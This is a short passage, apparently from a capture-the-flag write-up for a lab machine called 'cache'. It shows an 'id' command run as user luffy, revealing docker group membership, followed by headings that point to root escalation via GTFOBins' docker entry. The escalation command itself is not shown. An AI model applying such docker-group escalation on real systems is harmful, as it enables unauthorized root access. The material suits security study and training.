<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>luffy@cache:/<span class="nv">$ </span><span class="nb">id
id
</span><span class="nv">uid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span> <span class="nb">groups</span><span class="o">=</span>1001<span class="o">(</span>luffy<span class="o">)</span>,999<span class="o">(</span>docker<span class="o">)</span>
</code></pre></div></div>
<p><br /></p>

<h3 id="available-container---ubuntu-container">Available Container - Ubuntu Container</h3>

<h2 id="escalate-to-root">Escalate to Root</h2>

<h3 id="gtfobins---docker">GTFOBins - Docker</h3>

:ET